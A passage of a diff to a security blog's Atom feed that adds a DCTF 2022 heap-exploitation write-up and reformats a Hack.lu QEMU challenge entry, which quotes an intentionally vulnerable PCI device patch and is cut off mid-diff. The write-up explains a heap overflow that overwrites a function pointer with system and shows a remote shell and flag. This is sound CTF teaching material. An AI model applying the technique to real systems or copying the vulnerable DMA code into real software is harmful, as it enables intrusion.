@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/heap/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/heap/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-05-14T22:28:25+02:00</updated>
+    <updated>2022-05-20T02:20:23+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -17,6 +17,187 @@
             </author>
         
     <id>https://nasm.re/tags/heap/</id>
+        
+        <entry>
+            <title type="html"><![CDATA[[DCTF 2022 - pwn] phonebook]]></title>
+            <link href="https://nasm.re/posts/phonebook/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
+            <id>https://nasm.re/posts/phonebook/</id>
+            
+            <published>2022-04-17T00:00:00+00:00</published>
+            <updated>2022-04-17T00:00:00+00:00</updated>
+            
+            
+            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
+    <h2 id="intro">
+        Intro
+        <a data-clipboard-text="https://nasm.re/posts/phonebook/#intro" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Intro" href="#intro">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>phonebook is a basic heap challenge I did during the dctf event. It&rsquo;s basically just a heap overflow wich allows us to overflow a function pointer with for example the address of system.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="the-bug">
+        The bug
+        <a data-clipboard-text="https://nasm.re/posts/phonebook/#the-bug" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor The bug" href="#the-bug">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<pre tabindex="0"><code>$ ./phonebook
+Choose an option: [1-5]
+1. Store someone's information
+2. Edit information
+3. Call someone
+4. Unfriend someone
+5. Add the hidden_note
+&gt; 
+</code></pre><p>We can create an entity and then initialize: a name, a numero and a function pointer.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Person with id %d already exists!&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20uLL</span><span class="p">);</span>
+  <span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">get_name</span><span class="p">();</span>
+  <span class="n">LODWORD</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Phone number: &#34;</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span> <span class="c1">// phone number
+</span><span class="c1"></span>  <span class="n">s</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">choose_relation</span><span class="p">();</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+  <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>The bug lies <code>edit_name</code> function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">name_size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
+</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">];</span>
+  <span class="n">name_size</span> <span class="o">=</span> <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name length: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">name_size</span> <span class="o">!=</span> <span class="n">n</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+    <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
+  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>We can give it a new lentgh and if that&rsquo;s not equal to the current size field it frees the current name pointer and allocates a new name pointer <strong>without</strong> updating the size field. Which means if we edit the name pointer with a smaller size, the name pointer will be smaller compared to the size field, then we just have to edit again the size field to make it equal to <code>v4-&gt;name_size</code> to trigger a heap overflow through the <code>v4-&gt;name</code> pointer.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="leak-libc">
+        Leak libc
+        <a data-clipboard-text="https://nasm.re/posts/phonebook/#leak-libc" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak libc" href="#leak-libc">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Now we&rsquo;re able to overflow through the name pointer we have to find how the leak the libc, a nice way would be to leak it by using free&rsquo;d chunks in the unsortedbin. Or we can leak the <code>entity-&gt;func</code> function pointer which would give us a leak of the binary base address, then we would have to edit the name pointer with the got entry of <code>puts</code> to leak its address within the libc.</p>
+<p>To do so we can create another entity right after the name pointer:</p>
+<pre tabindex="0"><code>0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
+0x559b0d4d16c0	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
+0x559b0d4d16d0	0x0000559b0d4d1800	0x00000000000000fe	..M..U..........
+0x559b0d4d16e0	0x0000000000000000	0x0000000000000111	................
+0x559b0d4d16f0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1700	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1710	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1720	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1730	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1740	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1750	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1760	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1770	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1780	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d1790	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17b0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17c0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17d0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
+0x559b0d4d17e0	0x4141414141414141	0x0000414141414141	AAAAAAAAAAAAAA..
+0x559b0d4d17f0	0x0000000000000000	0x0000000000000031	........1.......
+0x559b0d4d1800	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
+0x559b0d4d1810	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
+0x559b0d4d1820	0x0000000000000000	0x0000000000000031	........1.......
+0x559b0d4d1830	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
+0x559b0d4d1840	0x0000559b0c851fa0	0x000000000000000a	.....U..........
+0x559b0d4d1850	0x0000000000000000	0x000000000001f7b1	................	 &lt;-- Top chunk
+</code></pre><p>The <code>edit_phone_number</code> overwrites the null byte:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_phone_number</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter new phone number: &#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%8s&#34;</span><span class="p">,</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div><p>To summarise:</p>
+<ul>
+<li>leak binary base address by overwriting the null byte (<code>edit_phone_number</code>) and then print the phone numer.</li>
+<li>leak libc base address by overwriting the name field of the second entity with the got entry of <code>puts</code></li>
+</ul>
+<div class="gblog-post__anchorwrap">
+    <h2 id="profit">
+        PROFIT
+        <a data-clipboard-text="https://nasm.re/posts/phonebook/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Then we just have to overwrite the function pointer with the address of <code>system</code> which takes as first argument a pointer to the entity structure of edit the phone number of the entity we wanna use because that&rsquo;s the first field of the structure which means we make it equivalent to a <code>system(&quot;/bin/sh&quot;)</code>.</p>
+<pre tabindex="0"><code>00000000 entity          struc ; (sizeof=0x20, mappedto_8)
+00000000 num             dq ?
+00000008 func            dq ?
+00000010 name            dq ?                    ; offset
+00000018 name_size       dq ?
+00000020 entity          ends
+</code></pre><p>Then here we are:</p>
+<pre tabindex="0"><code>$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
+[*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'.'
+[+] Opening connection to 51.124.222.205 on port 13380: Done
+[*] binary: 0x558980fdd000
+[*] libc @ 0x7fabfec57000
+[*] system @ 0x7fabfeca92c0
+[*] Switching to interactive mode
+$ id
+uid=1337 gid=1337 groups=1337
+$ cat flag.txt
+DCTF{C4n_1_g3t_y0ur_numb3r?}
+</code></pre>]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
+                             
+                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
+                             
+                                <category scheme="https://nasm.re/tags/dctf" term="dctf" label="dctf" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         
         <entry>
             <title type="html"><![CDATA[[Hack.lu 2021 - pwn] Cloudinspect]]></title>
@@ -64,227 +245,227 @@ The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
 <pre tabindex="0"><code>$ ls
 build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
 </code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
-new file mode <span class="m">100644</span>
-index 0000000000..f1c3f84b2a
---- /dev/null
-+++ b/hw/misc/cloudinspect.c
-@@ -0,0 +1,204 @@
-+/*
-+ * QEMU cloudinspect intentionally vulnerable PCI device
-+ *
-+ */
-+
-+#include <span class="s2">&#34;qemu/osdep.h&#34;</span>
-+#include <span class="s2">&#34;qemu/units.h&#34;</span>
-+#include <span class="s2">&#34;hw/pci/pci.h&#34;</span>
-+#include <span class="s2">&#34;hw/hw.h&#34;</span>
-+#include <span class="s2">&#34;hw/pci/msi.h&#34;</span>
-+#include <span class="s2">&#34;qom/object.h&#34;</span>
-+#include <span class="s2">&#34;qemu/module.h&#34;</span>
-+#include <span class="s2">&#34;qapi/visitor.h&#34;</span>
-+#include <span class="s2">&#34;sysemu/dma.h&#34;</span>
-+
-+#define TYPE_PCI_CLOUDINSPECT_DEVICE <span class="s2">&#34;cloudinspect&#34;</span>
-+typedef struct CloudInspectState CloudInspectState<span class="p">;</span>
-+DECLARE_INSTANCE_CHECKER<span class="o">(</span>CloudInspectState, CLOUDINSPECT,
-+                         TYPE_PCI_CLOUDINSPECT_DEVICE<span class="o">)</span>
-+
-+#define DMA_SIZE        <span class="m">4096</span>
-+#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
-+#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
-+#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
-+#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
-+#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98
-+
-+#define CLOUDINSPECT_VENDORID 0x1337
-+#define CLOUDINSPECT_DEVICEID 0x1337
-+#define CLOUDINSPECT_REVISION 0xc1
-+
-+#define CLOUDINSPECT_DMA_GET_VALUE      0x1
-+#define CLOUDINSPECT_DMA_PUT_VALUE      0x2
-+
-+struct CloudInspectState <span class="o">{</span>
-+    PCIDevice pdev<span class="p">;</span>
-+    MemoryRegion mmio<span class="p">;</span>
-+    AddressSpace *as<span class="p">;</span>
-+
-+    struct dma_state <span class="o">{</span>
-+        dma_addr_t src<span class="p">;</span>
-+        dma_addr_t dst<span class="p">;</span>
-+        dma_addr_t cnt<span class="p">;</span>
-+        dma_addr_t cmd<span class="p">;</span>
-+    <span class="o">}</span> dma<span class="p">;</span>
-+    char dma_buf<span class="o">[</span>DMA_SIZE<span class="o">]</span><span class="p">;</span>
-+<span class="o">}</span><span class="p">;</span>
-+
-+static void cloudinspect_dma_rw<span class="o">(</span>CloudInspectState *cloudinspect, bool write<span class="o">)</span>
-+<span class="o">{</span>
-+    <span class="k">if</span> <span class="o">(</span>write<span class="o">)</span> <span class="o">{</span>
-+        uint64_t <span class="nv">dst</span> <span class="o">=</span> cloudinspect-&gt;dma.dst<span class="p">;</span>
-+        // DMA_DIRECTION_TO_DEVICE: Read from an address space to PCI device
-+        dma_memory_read<span class="o">(</span>cloudinspect-&gt;as, cloudinspect-&gt;dma.src, cloudinspect-&gt;dma_buf + dst, cloudinspect-&gt;dma.cnt<span class="o">)</span><span class="p">;</span>
-+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-+        uint64_t <span class="nv">src</span> <span class="o">=</span> cloudinspect-&gt;dma.src<span class="p">;</span>
-+        // DMA_DIRECTION_FROM_DEVICE: Write to address space from PCI device
-+        dma_memory_write<span class="o">(</span>cloudinspect-&gt;as, cloudinspect-&gt;dma.dst, cloudinspect-&gt;dma_buf + src, cloudinspect-&gt;dma.cnt<span class="o">)</span><span class="p">;</span>
-+    <span class="o">}</span>
-+<span class="o">}</span>
-+
-+static bool cloudinspect_DMA_op<span class="o">(</span>CloudInspectState *cloudinspect, bool write<span class="o">)</span> <span class="o">{</span>
-+    switch <span class="o">(</span>cloudinspect-&gt;dma.cmd<span class="o">)</span> <span class="o">{</span>
-+        <span class="k">case</span> CLOUDINSPECT_DMA_GET_VALUE:
-+        <span class="k">case</span> CLOUDINSPECT_DMA_PUT_VALUE:
-+            <span class="k">if</span> <span class="o">(</span>cloudinspect-&gt;dma.cnt &gt; DMA_SIZE<span class="o">)</span> <span class="o">{</span>
-+                <span class="k">return</span> false<span class="p">;</span>
-+            <span class="o">}</span>
-+            cloudinspect_dma_rw<span class="o">(</span>cloudinspect, write<span class="o">)</span><span class="p">;</span>
-+            break<span class="p">;</span>
-+        default:
-+            <span class="k">return</span> false<span class="p">;</span>
-+    <span class="o">}</span>
-+
-+    <span class="k">return</span> true<span class="p">;</span>
-+<span class="o">}</span>
-+
-+static uint64_t cloudinspect_mmio_read<span class="o">(</span>void *opaque, hwaddr addr, unsigned size<span class="o">)</span>
-+<span class="o">{</span>
-+    CloudInspectState *cloudinspect <span class="o">=</span> opaque<span class="p">;</span>
-+    uint64_t <span class="nv">val</span> <span class="o">=</span> ~0ULL<span class="p">;</span>
-+
-+    switch <span class="o">(</span>addr<span class="o">)</span> <span class="o">{</span>
-+    <span class="k">case</span> 0x00:
-+        <span class="nv">val</span> <span class="o">=</span> 0xc10dc10dc10dc10d<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_CMD:
-+        <span class="nv">val</span> <span class="o">=</span> cloudinspect-&gt;dma.cmd<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_SRC:
-+        <span class="nv">val</span> <span class="o">=</span> cloudinspect-&gt;dma.src<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_DST:
-+        <span class="nv">val</span> <span class="o">=</span> cloudinspect-&gt;dma.dst<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_CNT:
-+        <span class="nv">val</span> <span class="o">=</span> cloudinspect-&gt;dma.cnt<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
-+        <span class="nv">val</span> <span class="o">=</span> cloudinspect_DMA_op<span class="o">(</span>cloudinspect, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="o">}</span>
-+
-+    <span class="k">return</span> val<span class="p">;</span>
-+<span class="o">}</span>
-+
-+static void cloudinspect_mmio_write<span class="o">(</span>void *opaque, hwaddr addr, uint64_t val,
-+                unsigned size<span class="o">)</span>
-+<span class="o">{</span>
-+    CloudInspectState *cloudinspect <span class="o">=</span> opaque<span class="p">;</span>
-+
-+    switch <span class="o">(</span>addr<span class="o">)</span> <span class="o">{</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_CMD:
-+        cloudinspect-&gt;dma.cmd <span class="o">=</span> val<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_SRC:
-+        cloudinspect-&gt;dma.src <span class="o">=</span> val<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_DST:
-+        cloudinspect-&gt;dma.dst <span class="o">=</span> val<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_CNT:
-+        cloudinspect-&gt;dma.cnt <span class="o">=</span> val<span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="k">case</span> CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
-+        <span class="nv">val</span> <span class="o">=</span> cloudinspect_DMA_op<span class="o">(</span>cloudinspect, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
-+        break<span class="p">;</span>
-+    <span class="o">}</span>
-+<span class="o">}</span>
-+
-+static const MemoryRegionOps <span class="nv">cloudinspect_mmio_ops</span> <span class="o">=</span> <span class="o">{</span>
-+    .read <span class="o">=</span> cloudinspect_mmio_read,
-+    .write <span class="o">=</span> cloudinspect_mmio_write,
-+    .endianness <span class="o">=</span> DEVICE_NATIVE_ENDIAN,
-+    .valid <span class="o">=</span> <span class="o">{</span>
-+        .min_access_size <span class="o">=</span> 4,
-+        .max_access_size <span class="o">=</span> 8,
-+    <span class="o">}</span>,
-+    .impl <span class="o">=</span> <span class="o">{</span>
-+        .min_access_size <span class="o">=</span> 4,
-+        .max_access_size <span class="o">=</span> 8,
-+    <span class="o">}</span>,
-+
-+<span class="o">}</span><span class="p">;</span>
-+
-+static void pci_cloudinspect_realize<span class="o">(</span>PCIDevice *pdev, Error **errp<span class="o">)</span>
-+<span class="o">{</span>
-+    CloudInspectState *cloudinspect <span class="o">=</span> CLOUDINSPECT<span class="o">(</span>pdev<span class="o">)</span><span class="p">;</span>
-+    // uint8_t *pci_conf <span class="o">=</span> pdev-&gt;config<span class="p">;</span>
-+
-+    <span class="k">if</span> <span class="o">(</span>msi_init<span class="o">(</span>pdev, 0, 1, true, false, errp<span class="o">))</span> <span class="o">{</span>
-+        <span class="k">return</span><span class="p">;</span>
-+    <span class="o">}</span>
-+
-+    cloudinspect-&gt;as <span class="o">=</span> <span class="p">&amp;</span>address_space_memory<span class="p">;</span>
-+    memory_region_init_io<span class="o">(</span><span class="p">&amp;</span>cloudinspect-&gt;mmio, OBJECT<span class="o">(</span>cloudinspect<span class="o">)</span>, <span class="p">&amp;</span>cloudinspect_mmio_ops, cloudinspect,
-+                    <span class="s2">&#34;cloudinspect-mmio&#34;</span>, <span class="m">1</span> * MiB<span class="o">)</span><span class="p">;</span>
-+    pci_register_bar<span class="o">(</span>pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, <span class="p">&amp;</span>cloudinspect-&gt;mmio<span class="o">)</span><span class="p">;</span>
-+<span class="o">}</span>
-+
-+static void pci_cloudinspect_uninit<span class="o">(</span>PCIDevice *pdev<span class="o">)</span>
-+<span class="o">{</span>
-+    // CloudInspectState *cloudinspect <span class="o">=</span> CLOUDINSPECT<span class="o">(</span>pdev<span class="o">)</span><span class="p">;</span>
-+
-+    msi_uninit<span class="o">(</span>pdev<span class="o">)</span><span class="p">;</span>
-+<span class="o">}</span>
-+
-+static void cloudinspect_instance_init<span class="o">(</span>Object *obj<span class="o">)</span>
-+<span class="o">{</span>
-+    // CloudInspectState *cloudinspect <span class="o">=</span> CLOUDINSPECT<span class="o">(</span>obj<span class="o">)</span><span class="p">;</span>
-+<span class="o">}</span>
-+
-+static void cloudinspect_class_init<span class="o">(</span>ObjectClass *class, void *data<span class="o">)</span>
-+<span class="o">{</span>
-+    DeviceClass *dc <span class="o">=</span> DEVICE_CLASS<span class="o">(</span>class<span class="o">)</span><span class="p">;</span>
-+    PCIDeviceClass *k <span class="o">=</span> PCI_DEVICE_CLASS<span class="o">(</span>class<span class="o">)</span><span class="p">;</span>
-+
-+    k-&gt;realize <span class="o">=</span> pci_cloudinspect_realize<span class="p">;</span>
-+    k-&gt;exit <span class="o">=</span> pci_cloudinspect_uninit<span class="p">;</span>
-+    k-&gt;vendor_id <span class="o">=</span> CLOUDINSPECT_VENDORID<span class="p">;</span>
-+    k-&gt;device_id <span class="o">=</span> CLOUDINSPECT_DEVICEID<span class="p">;</span>
-+    k-&gt;revision <span class="o">=</span> CLOUDINSPECT_REVISION<span class="p">;</span>
-+    k-&gt;class_id <span class="o">=</span> PCI_CLASS_OTHERS<span class="p">;</span>
-+    set_bit<span class="o">(</span>DEVICE_CATEGORY_MISC, dc-&gt;categories<span class="o">)</span><span class="p">;</span>
-+<span class="o">}</span>
-+
-+static void pci_cloudinspect_register_types<span class="o">(</span>void<span class="o">)</span>
-+<span class="o">{</span>
-+    static InterfaceInfo interfaces<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span>
-+        <span class="o">{</span> INTERFACE_CONVENTIONAL_PCI_DEVICE <span class="o">}</span>,
-+        <span class="o">{</span> <span class="o">}</span>,
-+    <span class="o">}</span><span class="p">;</span>
-+    static const TypeInfo <span class="nv">cloudinspect_info</span> <span class="o">=</span> <span class="o">{</span>
-+        .name          <span class="o">=</span> TYPE_PCI_CLOUDINSPECT_DEVICE,
-+        .parent        <span class="o">=</span> TYPE_PCI_DEVICE,
-+        .instance_size <span class="o">=</span> sizeof<span class="o">(</span>CloudInspectState<span class="o">)</span>,
-+        .instance_init <span class="o">=</span> cloudinspect_instance_init,
-+        .class_init    <span class="o">=</span> cloudinspect_class_init,
-+        .interfaces <span class="o">=</span> interfaces,
-+    <span class="o">}</span><span class="p">;</span>
-+
-+    type_register_static<span class="o">(</span><span class="p">&amp;</span>cloudinspect_info<span class="o">)</span><span class="p">;</span>
-+<span class="o">}</span>
-+type_init<span class="o">(</span>pci_cloudinspect_register_types<span class="o">)</span>
-diff --git a/hw/misc/meson.build b/hw/misc/meson.build
-index 1cd48e8a0f..5ff263ca2f <span class="m">100644</span>
---- a/hw/misc/meson.build
-+++ b/hw/misc/meson.build
-@@ -1,5 +1,6 @@
- softmmu_ss.add<span class="o">(</span>when: <span class="s1">&#39;CONFIG_APPLESMC&#39;</span>, if_true: files<span class="o">(</span><span class="s1">&#39;applesmc.c&#39;</span><span class="o">))</span>
- softmmu_ss.add<span class="o">(</span>when: <span class="s1">&#39;CONFIG_EDU&#39;</span>, if_true: files<span class="o">(</span><span class="s1">&#39;edu.c&#39;</span><span class="o">))</span>
-+softmmu_ss.add<span class="o">(</span>files<span class="o">(</span><span class="s1">&#39;cloudinspect.c&#39;</span><span class="o">))</span>
- softmmu_ss.add<span class="o">(</span>when: <span class="s1">&#39;CONFIG_FW_CFG_DMA&#39;</span>, if_true: files<span class="o">(</span><span class="s1">&#39;vmcoreinfo.c&#39;</span><span class="o">))</span>
- softmmu_ss.add<span class="o">(</span>when: <span class="s1">&#39;CONFIG_ISA_DEBUG&#39;</span>, if_true: files<span class="o">(</span><span class="s1">&#39;debugexit.c&#39;</span><span class="o">))</span>
- softmmu_ss.add<span class="o">(</span>when: <span class="s1">&#39;CONFIG_ISA_TESTDEV&#39;</span>, if_true: files<span class="o">(</span><span class="s1">&#39;pc-testdev.c&#39;</span><span class="o">))</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
+</span><span class="gh"></span>new file mode 100644
+<span class="gh">index 0000000000..f1c3f84b2a
+</span><span class="gh"></span><span class="gd">--- /dev/null
+</span><span class="gd"></span><span class="gi">+++ b/hw/misc/cloudinspect.c
+</span><span class="gi"></span><span class="gu">@@ -0,0 +1,204 @@
+</span><span class="gu"></span><span class="gi">+/*
+</span><span class="gi">+ * QEMU cloudinspect intentionally vulnerable PCI device
+</span><span class="gi">+ *
+</span><span class="gi">+ */
+</span><span class="gi">+
+</span><span class="gi">+#include &#34;qemu/osdep.h&#34;
+</span><span class="gi">+#include &#34;qemu/units.h&#34;
+</span><span class="gi">+#include &#34;hw/pci/pci.h&#34;
+</span><span class="gi">+#include &#34;hw/hw.h&#34;
+</span><span class="gi">+#include &#34;hw/pci/msi.h&#34;
+</span><span class="gi">+#include &#34;qom/object.h&#34;
+</span><span class="gi">+#include &#34;qemu/module.h&#34;
+</span><span class="gi">+#include &#34;qapi/visitor.h&#34;
+</span><span class="gi">+#include &#34;sysemu/dma.h&#34;
+</span><span class="gi">+
+</span><span class="gi">+#define TYPE_PCI_CLOUDINSPECT_DEVICE &#34;cloudinspect&#34;
+</span><span class="gi">+typedef struct CloudInspectState CloudInspectState;
+</span><span class="gi">+DECLARE_INSTANCE_CHECKER(CloudInspectState, CLOUDINSPECT,
